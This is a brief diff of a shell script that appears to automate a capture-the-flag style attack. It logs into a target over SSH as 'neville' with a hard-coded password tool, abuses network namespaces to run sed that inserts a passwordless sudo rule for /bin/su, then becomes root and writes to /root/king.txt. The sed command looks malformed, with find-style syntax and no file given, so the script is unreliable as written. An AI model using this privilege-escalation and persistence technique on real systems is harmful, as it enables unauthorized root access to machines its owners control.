@@ -59,7 +59,7 @@ vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p "$ssh_pass" ssh -o StrictHostKeychecking=no neville@"$IP" -p "$SSH_PORT" << EOF
 
-    ip netns add foo && ip netns exec foo sed -i '/^#includedir \/etc\/sudoers.d/a bobba ALL=(ALL) NOPASSWD: /bin/su' {} \;
+    ip netns add foo && ip netns exec foo sed -i '/^#includedir \/etc\/sudoers.d/a neville ALL=(ALL) NOPASSWD: /bin/su' {} \;
     sleep 1
     sudo su
     echo "$username" >> /root/king.txt
